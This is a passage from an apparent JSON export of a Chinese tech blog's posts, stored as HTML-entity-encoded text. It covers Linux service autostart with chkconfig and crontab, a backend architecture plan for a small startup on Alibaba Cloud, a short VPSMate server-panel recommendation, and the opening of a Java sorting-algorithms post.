&#x67E5;&#x770B;nginx&#x670D;&#x52A1;&#x542F;&#x52A8;&#x9009;&#x9879;&#x7684;&#x914D;&#x7F6E;&#x72B6;&#x6001;chkconfig --list | grep nginx# 0 - &#x505C;&#x673A;# 1 - &#x5355;&#x7528;&#x6237;&#x6A21;&#x5F0F; # 2 - &#x591A;&#x7528;&#x6237;&#xFF0C;&#x6CA1;&#x6709;NFS # 3 - &#x5B8C;&#x5168;&#x591A;&#x7528;&#x6237;&#x6A21;&#x5F0F;(&#x6807;&#x51C6;&#x7684;&#x8FD0;&#x884C;&#x7EA7;&#xFF0C;&#x547D;&#x4EE4;&#x884C;&#x6A21;&#x5F0F;&#x542F;&#x52A8;) # 4 - &#x6CA1;&#x6709;&#x7528;&#x5230; # 5 - X11(xwindow&#xFF0C;&#x56FE;&#x5F62;&#x754C;&#x9762;&#x542F;&#x52A8;) # 6 - &#x91CD;&#x65B0;&#x542F;&#x52A8; # &#x8FD0;&#x884C;&#x7EA7;&#x522B;&#x6700;&#x5E38;&#x7528;&#x7684;&#x8BBE;&#x7F6E;&#x4E3A;2,3,5nginx 0:off 1:off 2:on 3:on 4:on 5:on 6:off#&#x6DFB;&#x52A0;&#x7CFB;&#x7EDF;&#x670D;&#x52A1;chkconfig --add nginx#&#x5220;&#x9664;&#x7CFB;&#x7EDF;&#x670D;&#x52A1;chkconfig --del nginx#&#x8BA9;mysql&#x670D;&#x52A1;&#x5728;&#x547D;&#x4EE4;&#x884C;&#x6A21;&#x5F0F;&#xFF0C;&#x968F;&#x7CFB;&#x7EDF;&#x542F;&#x52A8;chkconfig --level 3 mysql on#&#x53D6;&#x6D88;mysql service&#x5728;runlevel3&#x7684;&#x81EA;&#x52A8;&#x542F;&#x52A8;&#x8BBE;&#x7F6E;chkconfig --level 5 mysql off#&#x67E5;&#x770B;&#x54EA;&#x4E9B;&#x7A0B;&#x5E8F;&#x88AB;&#x6DFB;&#x52A0;&#x4E3A;&#x81EA;&#x542F;&#x52A8;&#xFF0C;&#x5373;&#x67E5;&#x770B;&#x8FD9;&#x4E2A;&#x6587;&#x4EF6;&#x4E2D;&#x6DFB;&#x52A0;&#x4E86;&#x54EA;&#x4E9B;&#x7A0B;&#x5E8F;&#x8DEF;&#x5F84;cat /etc/rc.local &#x4E09;&#x3001;crontab&#x901A;&#x8FC7;crontab&#x53EF;&#x4EE5;&#x8BBE;&#x5B9A;&#x7A0B;&#x5E8F;&#x7684;&#x6267;&#x884C;&#x65F6;&#x95F4;&#x8868;&#xFF0C;&#x4F8B;&#x5982;&#x8BA9;&#x7A0B;&#x5E8F;&#x5728;&#x6BCF;&#x5929;&#x7684;8&#x70B9;&#xFF0C;&#x6216;&#x8005;&#x6BCF;&#x4E2A;&#x661F;&#x671F;&#x4E00;&#x7684;10&#x70B9;&#x6267;&#x884C;&#x4E00;&#x6B21;&#x3002;crontab -l &#x5217;&#x51FA;&#x65F6;&#x95F4;&#x8868;&#xFF1B;crontab -e&#x7F16;&#x8F91;&#x65F6;&#x95F4;&#x8868;&#xFF1B;crontab -d&#x5220;&#x9664;&#x65F6;&#x95F4;&#x8868;&#xFF1B; &#x201C;-l&#x201D;&#x5C31;&#x662F;&#x4E00;&#x4E2A;&#x67E5;&#x770B;&#x800C;&#x5DF2;&#xFF1B;&#x201C;-e&#x201D;&#x662F;&#x7F16;&#x8F91;&#xFF0C;&#x548C;vi&#x6CA1;&#x4EC0;&#x4E48;&#x5DEE;&#x522B;&#xFF08;&#x5176;&#x5B9E;&#x5C31;&#x662F;&#x7528;vi&#x7F16;&#x8F91;&#x4E00;&#x4E2A;&#x7279;&#x5B9A;&#x6587;&#x4EF6;&#xFF09;&#xFF1B;&#x201C;-d&#x201D;&#x57FA;&#x672C;&#x4E0D;&#x7528;&#xFF0C;&#x56E0;&#x4E3A;&#x5B83;&#x628A;&#x8BE5;&#x7528;&#x6237;&#x6240;&#x6709;&#x7684;&#x65F6;&#x95F4;&#x8868;&#x90FD;&#x5220;&#x9664;&#x4E86;&#xFF0C;&#x4E00;&#x822C;&#x90FD;&#x662F;&#x7528;&#x201C;-e&#x201D;&#x7F16;&#x8F91;&#x628A;&#x4E0D;&#x8981;&#x4E86;&#x7684;&#x65F6;&#x95F4;&#x8868;&#x9010;&#x884C;&#x5220;&#x9664;&#xFF1B; &#x90A3;&#x5230;&#x5E95;&#x8BE5;&#x5982;&#x4F55;&#x7F16;&#x8F91;&#x5462;&#xFF1F; crontab&#x6587;&#x4EF6;&#x7684;&#x683C;&#x5F0F;&#x662F;&#xFF1A;M H D m d CMD&#x3002;&#x4E00;&#x4E2A;6&#x4E2A;&#x5B57;&#x6BB5;&#xFF0C;&#x5176;&#x4E2D;&#x6700;&#x540E;&#x4E00;&#x4E2A;CMD&#x5C31;&#x662F;&#x6240;&#x8981;&#x6267;&#x884C;&#x7684;&#x7A0B;&#x5E8F;&#xFF0C;&#x5982;haha.sh&#x3002;M&#xFF1A;&#x5206;&#x949F;&#xFF08;0-59&#xFF09;H&#xFF1A;&#x5C0F;&#x65F6;&#xFF08;0-23&#xFF09;D&#xFF1A;&#x65E5;&#x671F;&#xFF08;1-31&#xFF09;m&#xFF1A;&#x6708;&#x4EFD;&#xFF08;1-12&#xFF09;d&#xFF1A;&#x4E00;&#x4E2A;&#x661F;&#x671F;&#x4E2D;&#x7684;&#x67D0;&#x5929;&#xFF08;0-6&#xFF0C;0&#x4EE3;&#x8868;&#x5468;&#x65E5;&#xFF09; &#x8FD9;5&#x4E2A;&#x65F6;&#x95F4;&#x5B57;&#x6BB5;&#x7528;&#x7A7A;&#x683C;&#x9694;&#x5F00;&#xFF0C;&#x5176;&#x503C;&#x53EF;&#x4EE5;&#x662F;&#x4E00;&#x4E2A;&#x6570;&#x5B57;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x7528;&#x9017;&#x53F7;&#x9694;&#x5F00;&#x7684;&#x591A;&#x4E2A;&#x6570;&#x5B57;&#xFF08;&#x6216;&#x5176;&#x4ED6;&#xFF09; &#xFF0C;&#x5982;&#x679C;&#x4E0D;&#x9700;&#x8BBE;&#x7F6E;&#xFF0C;&#x5219;&#x9ED8;&#x8BA4;&#x4E3A;&#x201C;*&#x201D;&#x3002; &#x4F8B;&#x5982;&#xFF0C;&#x6BCF;&#x5929;&#x7684;8&#x70B9;5&#x5206;&#x6267;&#x884C;haha.sh&#xFF0C;&#x5C31;&#x662F;&#x201C;5 8 * /opt/./haha.sh&#x201D;&#x3002; &#x597D;&#x50CF;&#x548C;&#x201C;&#x5F00;&#x673A;&#x7A0B;&#x5E8F;&#x81EA;&#x52A8;&#x542F;&#x52A8;&#x201D;&#x626F;&#x8FDC;&#x4E86;&#xFF0C;&#x73B0;&#x5728;&#x56DE;&#x5F52;&#x6B63;&#x9898;&#x3002;&#x5176;&#x5B9E;&#x4E0A;&#x9762;&#x4ECB;&#x7ECD;&#x7684;crontab&#x7684;&#x529F;&#x80FD;&#x5DF2;&#x7ECF;&#x5177;&#x5907;&#x4E86;&#x5F00;&#x673A;&#x81EA;&#x52A8;&#x542F;&#x52A8;&#x7684;&#x80FD;&#x529B;&#xFF0C;&#x53EF;&#x4EE5;&#x5199;&#x4E00;&#x4E2A;&#x76D1;&#x6D4B;&#x811A;&#x672C;&#xFF0C;&#x6BCF;5&#x5206;&#x949F;&#x6267;&#x884C;&#x4E00;&#x6B21;&#xFF08;/5 * ./haha.sh&#xFF09;&#xFF0C;&#x5982;&#x679C;&#x7A0B;&#x5E8F;&#x4E0D;&#x5728;&#x4E86;&#x5C31;&#x91CD;&#x65B0;&#x542F;&#x52A8;&#x4E00;&#x6B21;&#x3002;","raw":null,"content":null,"categories":[{"name":"运维部署","slug":"运维部署","permalink":"http://www.wangxin123.com/categories/运维部署/"}],"tags":[]},{"title":"创业互联网公司如何搭建自己的技术框架","slug":"创业互联网公司如何搭建自己的技术框架","date":"2016-09-06T10:24:17.000Z","updated":"2016-11-17T11:59:42.679Z","comments":true,"path":"2016/09/06/创业互联网公司如何搭建自己的技术框架/","link":"","permalink":"http://www.wangxin123.com/2016/09/06/创业互联网公司如何搭建自己的技术框架/","excerpt":"&#x9002;&#x7528;&#x8303;&#x56F4;&#x672C;&#x6587;&#x4E3B;&#x8981;&#x9488;&#x5BF9;&#x5C0F;&#x578B;&#x4E92;&#x8054;&#x7F51;&#x516C;&#x53F8;&#xFF0C;&#x7279;&#x522B;&#x9002;&#x7528;&#x4E8E;&#x624B;&#x673A;APP&#x7684;&#x540E;&#x53F0;&#x67B6;&#x6784;&#xFF0C;&#x57FA;&#x672C;&#x53EF;&#x4EE5;&#x652F;&#x6491;5&#x4E07;&#x65E5;&#x6D3B;&#x672C;&#x6587;&#x4F1A;&#x5BF9;&#x53EF;&#x80FD;&#x7528;&#x5230;&#x7684;&#x76F8;&#x5173;&#x6280;&#x672F;&#x8FDB;&#x884C;&#x6280;&#x672F;&#x9009;&#x578B;&#x7684;&#x8BF4;&#x660E;&#xFF0C;&#x4EE5;&#x53CA;&#x76F8;&#x5BF9;&#x5E94;&#x7684;&#x8BBE;&#x5907;&#x7684;&#x91C7;&#x8D2D;&#x3002; &#x6280;&#x672F;&#x6307;&#x6807;&#x8BF4;&#x4E00;&#x4E0B;&#x4E00;&#x4E9B;&#x6280;&#x672F;&#x6307;&#x6807;&#x7684;&#x8BA1;&#x7B97;&#x8FC7;&#x7A0B;&#x53EF;&#x4EE5;&#x4F5C;&#x4E3A;&#x5176;&#x4ED6;&#x540C;&#x5B66;&#x7684;&#x53C2;&#x8003; QPS&#xFF0C; &#x5982;&#x679C;&#x662F;5&#x4E07;&#x65E5;&#x6D3B;&#xFF0C;&#x4F7F;&#x7528;&#x96C6;&#x4E2D;&#x5728;&#x6BCF;&#x5929;&#x7684;4&#x5C0F;&#x65F6;&#xFF0C;&#x6BCF;&#x4E2A;&#x7528;&#x6237;&#x5927;&#x6982;&#x4EA7;&#x751F;100&#x7684;&#x8BF7;&#x6C42;&#xFF0C;&#x90A3;&#x4E48;&#x5E73;&#x5747;&#x4E0B;&#x6765;&#xFF0C;&#x6211;&#x4EEC;&#x7CFB;&#x7EDF;&#x5927;&#x6982;&#x5E94;&#x8BE5;&#x652F;&#x6491;&#x7684;&#x8BF7;&#x6C42;&#x4E3A;&#xFF1A;50000 100 / (4 60 * 60) = 350 qps/s &#x4E1A;&#x52A1;&#x6570;&#x636E; &#x4E1A;&#x52A1;&#x91CF;&#xFF0C;&#x6211;&#x4EEC;&#x81EA;&#x5DF1;&#x662F;&#x65B0;&#x95FB;&#x4E1A;&#x52A1;&#xFF0C;&#x53EF;&#x80FD;&#x4F1A;&#x6709;&#x5176;&#x4ED6;&#x7684;&#x4E1A;&#x52A1;&#xFF0C;&#x6BD4;&#x5982;&#x6E38;&#x620F;&#xFF0C;&#x5546;&#x57CE;&#x7B49;&#x7B49;&#xFF0C;&#x57FA;&#x672C;&#x6BCF;&#x5929;&#x65B0;&#x589E;&#x7684;&#x4E1A;&#x52A1;&#x6570;&#x636E;&#x90FD;&#x4F1A;&#x5728;&#x540C;&#x4E00;&#x4E2A;&#x91CF;&#x7EA7;&#xFF0C; &#x6BCF;&#x65E5;10000&#xFF0C; &#x53E6;&#x5916;&#x8DDF;&#x7528;&#x6237;&#x76F8;&#x5173;&#x7684;&#x4FE1;&#x606F;&#x4E5F;&#x662F;&#x6BD4;&#x8F83;&#x5927;&#x7684;&#x4E00;&#x5757;&#xFF0C;&#x6BD4;&#x5982;&#x7528;&#x6237;&#x7684;&#x8BA2;&#x9605;&#x7B49;&#x884C;&#x4E3A;&#xFF0C;&#x4E00;&#x5171;5&#x4E07;&#x7684;&#x7528;&#x6237;&#xFF0C;&#x4FDD;&#x5B58;&#x76F8;&#x5173;&#x4FE1;&#x606F;&#x53EF;&#x80FD;&#x5927;&#x6982;&#x9700;&#x8981;100&#x6761;&#x7684;&#x6570;&#x636E;&#x3002; &#x7F13;&#x5B58;&#x5927;&#x5C0F; &#x4E3B;&#x8981;&#x4E1A;&#x52A1;&#x6570;&#x636E;&#x548C;&#x7528;&#x6237;&#x76F8;&#x5173;&#x7684;&#x70ED;&#x70B9;&#x6570;&#x636E;&#x9650;&#x65F6;&#x4FDD;&#x5B58;&#x5728;&#x7F13;&#x5B58;&#x4E2D;&#xFF0C; &#x5927;&#x6982;&#x9700;&#x8981;5&#x4E2A;G&#x5DE6;&#x53F3;&#x3002; &#x65E5;&#x5FD7;&#x5927;&#x5C0F; &#x7528;&#x6237;&#x65E5;&#x5FD7;&#x548C;&#x8BF7;&#x6C42;&#x65E5;&#x5FD7;&#x3002; &#x5927;&#x6982;&#x6BCF;&#x5929;3&#x4E2A;G&#x5DE6;&#x53F3; &#x6280;&#x672F;&#x67B6;&#x6784;","keywords":null,"text":"&#x9002;&#x7528;&#x8303;&#x56F4;&#x672C;&#x6587;&#x4E3B;&#x8981;&#x9488;&#x5BF9;&#x5C0F;&#x578B;&#x4E92;&#x8054;&#x7F51;&#x516C;&#x53F8;&#xFF0C;&#x7279;&#x522B;&#x9002;&#x7528;&#x4E8E;&#x624B;&#x673A;APP&#x7684;&#x540E;&#x53F0;&#x67B6;&#x6784;&#xFF0C;&#x57FA;&#x672C;&#x53EF;&#x4EE5;&#x652F;&#x6491;5&#x4E07;&#x65E5;&#x6D3B;&#x672C;&#x6587;&#x4F1A;&#x5BF9;&#x53EF;&#x80FD;&#x7528;&#x5230;&#x7684;&#x76F8;&#x5173;&#x6280;&#x672F;&#x8FDB;&#x884C;&#x6280;&#x672F;&#x9009;&#x578B;&#x7684;&#x8BF4;&#x660E;&#xFF0C;&#x4EE5;&#x53CA;&#x76F8;&#x5BF9;&#x5E94;&#x7684;&#x8BBE;&#x5907;&#x7684;&#x91C7;&#x8D2D;&#x3002; &#x6280;&#x672F;&#x6307;&#x6807;&#x8BF4;&#x4E00;&#x4E0B;&#x4E00;&#x4E9B;&#x6280;&#x672F;&#x6307;&#x6807;&#x7684;&#x8BA1;&#x7B97;&#x8FC7;&#x7A0B;&#x53EF;&#x4EE5;&#x4F5C;&#x4E3A;&#x5176;&#x4ED6;&#x540C;&#x5B66;&#x7684;&#x53C2;&#x8003; QPS&#xFF0C; &#x5982;&#x679C;&#x662F;5&#x4E07;&#x65E5;&#x6D3B;&#xFF0C;&#x4F7F;&#x7528;&#x96C6;&#x4E2D;&#x5728;&#x6BCF;&#x5929;&#x7684;4&#x5C0F;&#x65F6;&#xFF0C;&#x6BCF;&#x4E2A;&#x7528;&#x6237;&#x5927;&#x6982;&#x4EA7;&#x751F;100&#x7684;&#x8BF7;&#x6C42;&#xFF0C;&#x90A3;&#x4E48;&#x5E73;&#x5747;&#x4E0B;&#x6765;&#xFF0C;&#x6211;&#x4EEC;&#x7CFB;&#x7EDF;&#x5927;&#x6982;&#x5E94;&#x8BE5;&#x652F;&#x6491;&#x7684;&#x8BF7;&#x6C42;&#x4E3A;&#xFF1A;50000 100 / (4 60 * 60) = 350 qps/s &#x4E1A;&#x52A1;&#x6570;&#x636E; &#x4E1A;&#x52A1;&#x91CF;&#xFF0C;&#x6211;&#x4EEC;&#x81EA;&#x5DF1;&#x662F;&#x65B0;&#x95FB;&#x4E1A;&#x52A1;&#xFF0C;&#x53EF;&#x80FD;&#x4F1A;&#x6709;&#x5176;&#x4ED6;&#x7684;&#x4E1A;&#x52A1;&#xFF0C;&#x6BD4;&#x5982;&#x6E38;&#x620F;&#xFF0C;&#x5546;&#x57CE;&#x7B49;&#x7B49;&#xFF0C;&#x57FA;&#x672C;&#x6BCF;&#x5929;&#x65B0;&#x589E;&#x7684;&#x4E1A;&#x52A1;&#x6570;&#x636E;&#x90FD;&#x4F1A;&#x5728;&#x540C;&#x4E00;&#x4E2A;&#x91CF;&#x7EA7;&#xFF0C; &#x6BCF;&#x65E5;10000&#xFF0C; &#x53E6;&#x5916;&#x8DDF;&#x7528;&#x6237;&#x76F8;&#x5173;&#x7684;&#x4FE1;&#x606F;&#x4E5F;&#x662F;&#x6BD4;&#x8F83;&#x5927;&#x7684;&#x4E00;&#x5757;&#xFF0C;&#x6BD4;&#x5982;&#x7528;&#x6237;&#x7684;&#x8BA2;&#x9605;&#x7B49;&#x884C;&#x4E3A;&#xFF0C;&#x4E00;&#x5171;5&#x4E07;&#x7684;&#x7528;&#x6237;&#xFF0C;&#x4FDD;&#x5B58;&#x76F8;&#x5173;&#x4FE1;&#x606F;&#x53EF;&#x80FD;&#x5927;&#x6982;&#x9700;&#x8981;100&#x6761;&#x7684;&#x6570;&#x636E;&#x3002; &#x7F13;&#x5B58;&#x5927;&#x5C0F; &#x4E3B;&#x8981;&#x4E1A;&#x52A1;&#x6570;&#x636E;&#x548C;&#x7528;&#x6237;&#x76F8;&#x5173;&#x7684;&#x70ED;&#x70B9;&#x6570;&#x636E;&#x9650;&#x65F6;&#x4FDD;&#x5B58;&#x5728;&#x7F13;&#x5B58;&#x4E2D;&#xFF0C; &#x5927;&#x6982;&#x9700;&#x8981;5&#x4E2A;G&#x5DE6;&#x53F3;&#x3002; &#x65E5;&#x5FD7;&#x5927;&#x5C0F; &#x7528;&#x6237;&#x65E5;&#x5FD7;&#x548C;&#x8BF7;&#x6C42;&#x65E5;&#x5FD7;&#x3002; &#x5927;&#x6982;&#x6BCF;&#x5929;3&#x4E2A;G&#x5DE6;&#x53F3; &#x6280;&#x672F;&#x67B6;&#x6784; &#x6574;&#x4F53;&#x67B6;&#x6784;&#x56E0;&#x4E3A;&#x662F;&#x5C0F;&#x516C;&#x53F8;&#xFF0C;&#x6211;&#x4EEC;&#x57FA;&#x4E8E;&#x963F;&#x91CC;&#x4E91;&#x6765;&#x642D;&#x5EFA;&#xFF0C;&#x5BF9;&#x56FE;&#x4E2D;&#x7684;&#x5185;&#x5BB9;&#x548C;&#x6280;&#x672F;&#x9009;&#x578B;&#x8FDB;&#x884C;&#x4E00;&#x4E0B;&#x8BF4;&#x660E;&#xFF1A; &#x8D1F;&#x8F7D;&#x5747;&#x8861; &#x53EF;&#x9009;&#x65B9;&#x6848;&#xFF1A; SLB, Nginx. SLB&#x8981;&#x6536;&#x94B1;&#xFF0C;&#x4F46;&#x662F;&#x6BD4;&#x8F83;&#x4FBF;&#x5B9C;&#xFF0C;&#x6709;&#x4FDD;&#x8BC1;&#xFF0C;&#x4E0D;&#x4F1A;&#x6302;&#x3002; &#x4F46;&#x662F;&#x53EF;&#x914D;&#x7F6E;&#x7684;&#x5F88;&#x5C11;&#xFF0C;&#x4E0D;&#x80FD;&#x6839;&#x636E;&#x57DF;&#x540D;&#x505A;ip&#x6620;&#x5C04; Nginx, &#x6CA1;&#x5565;&#x7F3A;&#x70B9;&#xFF0C;&#x9700;&#x8981;&#x4E00;&#x5B9A;&#x7684;&#x77E5;&#x8BC6;&#x3002;&#x5EFA;&#x8BAE;&#xFF1A; SLB + Nginx, SLB&#x7ED1;&#x5B9A;&#x57DF;&#x540D;&#x4F5C;&#x4E3A;&#x7EDF;&#x4E00;&#x7684;&#x5165;&#x53E3;&#xFF0C;&#x7136;&#x540E;&#x6BCF;&#x4E2A;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x518D;&#x642D;&#x5EFA;Nginx. CDN&#x7528;&#x4E8E;&#x7F13;&#x5B58;&#x9759;&#x6001;&#x6587;&#x4EF6;&#x7B49;&#x7B49;&#x3002; &#x4E03;&#x725B;&#x548C;&#x963F;&#x91CC;&#x7684;&#x90FD;&#x8FD8;&#x53EF;&#x4EE5;&#x3002; &#x4E03;&#x725B;&#x8981;&#x505A;&#x7684;&#x4E45;&#x4E00;&#x70B9;&#xFF0C; &#x5404;&#x79CD;&#x56FE;&#x7247;&#x5904;&#x7406;&#x7684;&#x63A5;&#x53E3;&#x8981;&#x5B8C;&#x5584;&#x4E00;&#x4E9B; &#x963F;&#x91CC;&#x7684;CDN&#x8981;&#x7A0D;&#x5FAE;&#x597D;&#x4E00;&#x70B9;&#x70B9;&#xFF0C; &#x4F46;&#x662F;&#x6CA1;&#x6709;&#x4E0D;&#x5B89;&#x5168;&#x7684;&#x8BBF;&#x95EE;&#x65B9;&#x5F0F;&#xFF0C;&#x8BBF;&#x95EE;&#x7A0D;&#x5FAE;&#x6CA1;&#x6709;&#x90A3;&#x4E48;&#x7075;&#x6D3B;&#x3002; &#x56FE;&#x7247;&#x5904;&#x7406;&#x529F;&#x80FD;&#x5F31;&#x4E00;&#x70B9;&#x3002; &#x5206;&#x5E03;&#x5F0F;&#x8C03;&#x7528;&#x6846;&#x67B6;&#x76EE;&#x524D;&#x53EF;&#x9009;&#x7684;&#x6709;ZK + dubbo. ZK + Motan, ZK + dubbox, edas&#x3002; dubbo, &#x963F;&#x91CC;&#x7684;&#x670D;&#x52A1;&#x6CBB;&#x7406;&#x6846;&#x67B6;&#xFF0C;&#x5DF2;&#x7ECF;&#x4E0D;&#x7EF4;&#x62A4;&#x4E86;&#xFF0C;&#x5207;&#x6362;&#x53CD;&#x5E94;&#x6709;&#x70B9;&#x6162; dubboX, &#x5F53;&#x5F53;&#x57FA;&#x4E8E;dubbo&#x641E;&#x7684;&#xFF0C;&#x8FD8;&#x5728;&#x7EF4;&#x62A4;&#x53EF;&#x4EE5;&#x4E00;&#x7528;&#xFF0C;&#x63A8;&#x8350;&#x3002; Motan, &#x5FAE;&#x535A;&#x7684;&#x670D;&#x52A1;&#x6CBB;&#x7406;&#x77FF;&#x5EFA;&#xFF0C; &#x521A;&#x5F00;&#x6E90;&#xFF0C;&#x9700;&#x8981;&#x5B66;&#x4E60;&#x4E00;&#x4E0B;&#xFF0C; &#x63A8;&#x8350;&#x3002; Edas, &#x963F;&#x91CC;&#x4E91;&#x670D;&#x52A1;&#xFF0C;&#x8981;&#x6536;&#x94B1;&#xFF0C;&#x4FB5;&#x5165;&#x578B;&#x5F88;&#x5F3A;&#xFF0C;&#x4E0D;&#x63A8;&#x8350; MQ&#x53EF;&#x9009;&#x7684;&#x6709;&#xFF1A; ActiveMQ, &#x963F;&#x91CC;&#x4E91;&#x6D88;&#x606F;&#xFF0C; robbitMQ,&#x5404;&#x6709;&#x597D;&#x5904;&#xFF0C; &#x4F46;&#x662F;&#x8003;&#x8651;&#x5230;&#x8FD0;&#x7EF4;&#x7684;&#x96BE;&#x5EA6;&#xFF0C;&#x63A8;&#x8350;&#x963F;&#x91CC;&#x4E91;&#x6D88;&#x606F;&#x3002; Redis&#x7528;&#x6765;&#x505A;&#x7F13;&#x5B58;&#xFF0C; &#x81EA;&#x5EFA;&#x6210;&#x672C;&#x6709;&#x70B9;&#x9AD8;&#xFF0C;&#x9700;&#x8981;Codis, &#x5206;&#x7247;&#xFF0C;&#x96C6;&#x7FA4;&#xFF0C;&#x4E3B;&#x4ECE;&#x7B49;&#x7B49;&#xFF0C;&#x5F88;&#x9EBB;&#x70E6;&#x3002; &#x5EFA;&#x8BAE;&#x76F4;&#x63A5;&#x7528;&#x963F;&#x91CC;&#x7684; &#x6570;&#x636E;&#x5E93;&#x4E3B;&#x8981;&#x57FA;&#x4E8E;&#x8BFB;&#x5199;&#x5206;&#x79BB;&#x548C;&#x4E3B;&#x4ECE;&#x590D;&#x5236;&#x8003;&#x8651;&#xFF0C;&#x76EE;&#x524D;&#x53EF;&#x4EE5;&#x81EA;&#x5EFA;&#x548C;&#x9009;&#x7528;&#x963F;&#x91CC;&#x7684;DRDS&#x3002; DRDS &#x8981;&#x82B1;&#x94B1;&#xFF0C;&#x6210;&#x672C;&#x8F83;&#x9AD8;&#xFF0C;&#x6CA1;&#x6709;&#x5FC5;&#x8981; &#x81EA;&#x5EFA;&#xFF0C; &#x4E0D;&#x7528;&#x4E2D;&#x95F4;&#x4EF6;&#xFF0C;&#x76F4;&#x63A5;1&#x5199;2&#x53EA;&#x8BFB;&#xFF0C; &#x7136;&#x540E;&#x914D;&#x7F6E;&#x8BFB;&#x5199;&#x5206;&#x79BB;&#x7684;&#x6570;&#x636E;&#x6E90;&#xFF0C;&#x5185;&#x7F51;SLB&#x8FDB;&#x884C;&#x8BFB;&#x96C6;&#x7FA4;&#x3002;&#x89E3;&#x51B3;&#x4E4B;&#x3002; &#x641C;&#x7D22;&#x5EFA;&#x8BAE;ELK&#xFF0C; &#x53EF;&#x4EE5;&#x81EA;&#x52A8;&#x540C;&#x6B65;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x9664;&#x4E86;&#x641C;&#x7D22;&#x5F15;&#x64CE;&#x7684;&#x529F;&#x80FD;&#x5916;&#xFF0C;&#x8FD8;&#x53EF;&#x4EE5;&#x505A;&#x65E5;&#x5FD7;&#x641C;&#x7D22;&#xFF0C;&#x76D1;&#x63A7;&#x7CFB;&#x7EDF;&#x3002; &#x4E00;&#x4E9B;&#x5178;&#x578B;&#x7684;&#x4E1A;&#x52A1;&#x573A;&#x666F;&#x8BF4;&#x660E;&#x628A;&#x4E1A;&#x52A1;&#x5E95;&#x5C42;&#x505A;&#x6210;SOA&#x6A21;&#x5757;&#xFF0C;&#x901A;&#x8FC7;&#x5206;&#x5E03;&#x5F0F;&#x8C03;&#x7528;&#x6846;&#x67B6;&#x5BF9;&#x5916;&#x63D0;&#x4F9B;&#x670D;&#x52A1;&#x3002;&#x5355;&#x72EC;&#x505A;&#x4E00;&#x4E2A;&#x5C0F;&#x7684;&#x7CFB;&#x7EDF;&#x6765;&#x8FD0;&#x884C;&#x5B9A;&#x65F6;&#x4EFB;&#x52A1;&#x70ED;&#x70B9;&#x6570;&#x636E;&#x653E;&#x7F13;&#x5B58;&#xFF0C;&#x7136;&#x540E;&#x901A;&#x8FC7;MQ&#x6765;&#x66F4;&#x65B0;&#x7F13;&#x5B58;&#x65E5;&#x5FD7;&#x7B49;&#x6570;&#x636E;&#x6709;&#x5FC5;&#x8981;&#x53EF;&#x4EE5;&#x8003;&#x8651;&#x4E0A;&#x4E2A;Mongo","raw":null,"content":null,"categories":[{"name":"我的收藏","slug":"我的收藏","permalink":"http://www.wangxin123.com/categories/我的收藏/"}],"tags":[]},{"title":"VPSMate","slug":"VPSMate","date":"2016-08-30T10:24:17.000Z","updated":"2016-11-17T11:59:42.671Z","comments":true,"path":"2016/08/30/VPSMate/","link":"","permalink":"http://www.wangxin123.com/2016/08/30/VPSMate/","excerpt":"","keywords":null,"text":"VPSMate&#x7279;&#x6027;&#x6700;&#x8FD1;&#x53D1;&#x73B0;&#x4E86;&#x4E00;&#x4E2A;Linux&#x670D;&#x52A1;&#x5668;WEB&#x7BA1;&#x7406;&#x5DE5;&#x5177;&#xFF0C;&#x633A;&#x4E0D;&#x9519;&#x7684;&#xFF0C;&#x6709;&#x5982;&#x4E0B;&#x6027;&#x80FD;&#xFF1A; &#x5FEB;&#x901F;&#x5728;&#x7EBF;&#x5B89;&#x88C5;&#x3001;&#x5C0F;&#x5DE7;&#x4E14;&#x8282;&#x7701;&#x8D44;&#x6E90; &#x5F53;&#x524D;&#x652F;&#x6301; CentOS/Redhat 5.4+&#x3001;6.x &#x57FA;&#x4E8E;&#x53D1;&#x884C;&#x7248;&#x8F6F;&#x4EF6;&#x6E90;&#x7684;&#x8F6F;&#x4EF6;&#x7BA1;&#x7406;&#x673A;&#x5236; &#x8F7B;&#x677E;&#x6784;&#x5EFA; Linux + Nginx + MySQL + PHP &#x73AF;&#x5883; &#x5F3A;&#x5927;&#x7684;&#x5728;&#x7EBF;&#x6587;&#x4EF6;&#x7BA1;&#x7406;&#x548C;&#x56DE;&#x6536;&#x7AD9;&#x673A;&#x5236; &#x5FEB;&#x901F;&#x521B;&#x5EFA;&#x548C;&#x5B89;&#x88C5;&#x591A;&#x79CD;&#x7AD9;&#x70B9; &#x4E30;&#x5BCC;&#x5B9E;&#x7528;&#x7684;&#x7CFB;&#x7EDF;&#x5DE5;&#x5177; VPSMate&#x5B98;&#x7F51;http://www.vpsmate.org/ &#x6838;&#x5FC3;&#x5B89;&#x88C5;&#x6587;&#x4EF6;install.py &#x4E0B;&#x8F7D;&#x5730;&#x5740;http://pan.baidu.com/s/1eSgFpIU &#x5BC6;&#x7801;&#xFF1A;yaju","raw":null,"content":null,"categories":[{"name":"运维部署","slug":"运维部署","permalink":"http://www.wangxin123.com/categories/运维部署/"}],"tags":[{"name":"VPSMate","slug":"VPSMate","permalink":"http://www.wangxin123.com/tags/VPSMate/"}]},{"title":"Java常用算法","slug":"Java常用算法","date":"2016-07-29T10:53:00.000Z","updated":"2016-11-17T11:59:42.664Z","comments":true,"path":"2016/07/29/Java常用算法/","link":"","permalink":"http://www.wangxin123.com/2016/07/29/Java常用算法/","excerpt":"&#x5E38;&#x89C1;&#x6392;&#x5E8F;&#x4E4B;&#x95F4;&#x7684;&#x5173;&#x7CFB;:","keywords":null,"text":"&#x5E38;&#x89C1;&#x6392;&#x5E8F;&#x4E4B;&#x95F4;&#x7684;&#x5173;&#x7CFB;: 1&#x3001;&#x76F4;&#x63A5;&#x63D2;&#x5165;&#x6392;&#x5E8F;&#xFF08;1&#xFF09;&#x57FA;&#x672C;&#x601D;&#x60F3;&#xFF1A;&#x5728;&#x8981;&#x6392;&#x5E8F;&#x7684;&#x4E00;&#x7EC4;&#x6570;&#x4E2D;&#xFF0C;&#x5047;&#x8BBE;&#x524D;&#x9762;(n-1)[n&gt;=2] 